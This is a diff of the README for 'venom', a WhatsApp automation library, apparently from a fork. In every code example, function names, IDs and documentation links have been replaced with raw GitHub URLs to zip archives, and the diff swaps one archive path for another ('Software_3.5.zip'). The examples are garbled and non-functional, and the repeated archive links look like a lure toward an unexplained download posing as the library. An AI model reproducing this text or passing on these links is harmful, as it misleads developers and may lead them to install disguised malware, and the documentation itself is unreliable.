-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Promote participant (Give admin privileges)
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Demote particiapnt (Revoke admin privileges)
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Get group admins
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Return the group status, jid, description from it's invite link
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(InviteCode);
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(InviteCode);
 
 // Join a group using the group invite code
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(InviteCode);
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(InviteCode);
 ```
 
 ## Profile Functions
 
 ```javascript
 // Set client status
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('On vacations! ✈️');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('On vacations! ✈️');
 
 // Set client profile name
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Venom bot');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Venom bot');
 
 // Set client profile photo
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Get device info
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 ```
 
 ## Device Functions
 
 ```javascript
 // Disconnect from service
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 // Delete the Service Worker
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 // Load the service again
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 // Get connection state
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 // Get battery level
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 // Is connected
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 // Get whatsapp web version
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 ```
 
 ## Events
@@ -828,17 +828,17 @@ await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty
 
 //Listens to all new messages
 //To receiver or recipient
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(message => {
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(message => {
   ...
 };
 
 // Listen to messages
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(message => {
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(message => {
   ...
 })
 
 // Listen to state changes
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(state => {
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(state => {
   ...
 });
 
@@ -858,24 +858,24 @@ https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom
 //  3 = READ,
 //  4 = PLAYED =
 
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(ack => {
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(ack => {
   ...
 });
 
 // Listen to live location
-// chatId: 'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip'
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip("https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip", (liveLocation) => {
+// chatId: 'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip'
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip("https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip", (liveLocation) => {
   ...
 });
 
-// chatId looks like this: 'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip'
-// Event interface is in here: https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip("https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip", (event) => {
+// chatId looks like this: 'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip'
+// Event interface is in here: https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip("https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip", (event) => {
   ...
 });
 
 // Listen when client has been added to a group
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(chatEvent => {
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(chatEvent => {
   ...
 });
 ```
@@ -887,10 +887,10 @@ https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom
 await client
   .checkChat(chatId)
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Pin chat and Unpin chat messages with true or false
@@ -898,76 +898,76 @@ await client
 await client
   .pinChat(chatId, true, false)
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 ///mute a contact
 await client
   .sendMute(
-    'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', //contact mute
+    'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', //contact mute
     30, //duration of silence, example: 30 minutes
     'minutes' ///kind of silence "hours" "minutes" "year"
   )
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 ///unmute contact
 await client
   .sendMute(
-    'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip' //contact unmute
+    'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip' //contact unmute
   )
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Change the theme
 // string types "dark" or "light"
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('dark');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('dark');
 
 // Receive the current theme
 // returns string light or dark
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 // Delete chat
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Clear chat messages
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Archive and unarchive chat messages with true or false
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(chatId, true);
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(chatId, true);
 
 // Delete message (last parameter: delete only locally)
 await client
-  .deleteMessage('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', [
-    'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
-    'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip'
+  .deleteMessage('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', [
+    'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
+    'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip'
   ])
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Mark chat as not seen (returns true if it works)
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Blocks a user (returns true if it works)
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Unlocks contacts (returns true if it works)
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 ```
 
 ## Misc
@@ -992,12 +992,12 @@ There are some tricks for a better usage of venom.
 // UNLAUNCHED
 // UNPAIRED
 // UNPAIRED_IDLE
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip((state) => {
-  https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('State changed: ', state);
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip((state) => {
+  https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('State changed: ', state);
   // force whatsapp take over
-  if ('CONFLICT'.includes(state)) https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+  if ('CONFLICT'.includes(state)) https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
   // detect disconnect on whatsapp
-  if ('UNPAIRED'.includes(state)) https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('logout');
+  if ('UNPAIRED'.includes(state)) https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('logout');
 });
 
 // DISCONNECTED
@@ -1005,20 +1005,20 @@ https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom
 // RESUMING
 // CONNECTED
 let time = 0;
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip((state) => {
-  https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('State Connection Stream: ' + state);
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip((state) => {
+  https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('State Connection Stream: ' + state);
   clearTimeout(time);
   if (state === 'DISCONNECTED' || state === 'SYNCING') {
     time = setTimeout(() => {
-      https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+      https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
     }, 80000);
   }
 });
 
 // function to detect incoming call
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(async (call) => {
-  https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(call);
-  https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip, "Sorry, I still can't answer calls");
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(async (call) => {
+  https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(call);
+  https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip, "Sorry, I still can't answer calls");
 });
 ```
 
@@ -1029,15 +1029,15 @@ log in (So it won't ask for QR scan again). So instead of CTRL+C,
 
 ```javascript
 // Catch ctrl+C
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('SIGINT', function() {
-  https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('SIGINT', function() {
+  https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 });
 
 // Try-catch close
 try {
    ...
 } catch (error) {
-   https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+   https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 }
 ```
 
@@ -1054,7 +1054,7 @@ Use "autoClose: 0 | false" to disable auto closing.
 
 You can use cached versions of WhatsApp Web by passing the `webVersion` arguments as part of your venom options:
 ```javascript
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip({
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip({
     session: 'sessionname', //name of session
     headless: false,
     logQR: true,
@@ -1064,7 +1064,7 @@ https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom
     start(client);
   });
 ```
-This feature can use any version available in the list at https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip
+This feature can use any version available in the list at https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip
 ## Development
 
 Building venom is really simple altough it contains 3 main projects inside
